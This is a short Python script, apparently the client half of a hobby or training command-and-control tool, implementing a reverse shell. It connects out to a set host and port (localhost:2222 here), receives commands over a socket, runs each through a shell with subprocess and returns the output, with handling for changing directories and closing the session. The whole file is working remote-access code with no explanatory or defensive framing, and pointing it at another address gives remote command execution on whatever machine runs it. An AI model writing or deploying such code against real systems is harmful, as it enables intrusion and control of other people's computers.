import socket
import subprocess
import os
import sys

def inbound():
    print(f'[+] Awaiting response...')
    message = ""
    while True:
        try:
            message = sock.recv(1024).decode()
            return message
        except Exception:
            sock.close()

def outbound(message):
    response = str(message).encode()
    sock.send(response)


# Forms connection to server with IP and port
def session_handler():
    print(f'[+] Connection to {host_ip}.')
    sock.connect((host_ip, host_port))
    print(f'[+] Connected to {host_ip}.')
    while True:
            # Try/Catch to ensure connection is closed in the case of any errors
            try:
                # message must be decoded since it is sent in bytes
                message = inbound()
                # exit message handler
                if message.lower() == 'exit':
                    print('[+] Connection closed from remote host')
                    sock.close()
                    break
                elif message.lower() == 'background':
                    pass
                elif message.split(" ")[0] == 'cd':
                    try:
                        directory = str(message.split(" ")[1])
                        os.chdir(directory)
                        cur_dir = os.getcwd()
                        print(f'[+] Changed to - {cur_dir}')
                        outbound(cur_dir)
                    except FileNotFoundError:
                        outbound('[-] Invalid directory')
                        continue
                else:
                    command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output = command.stdout.read() + command.stderr.read()
                    outbound(output.decode())

            except KeyboardInterrupt:
                print("\n[+] Keyboard Interrupt Issued")
                sock.close()
                break

            except Exception:
                sock.close()
                break

if __name__ == '__main__':
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host_ip = '127.0.0.1'
        host_port = 2222
        session_handler()
    except IndexError:
        print('[-] Command line arguments not supplied')
    except Exception as e:
        print(e)
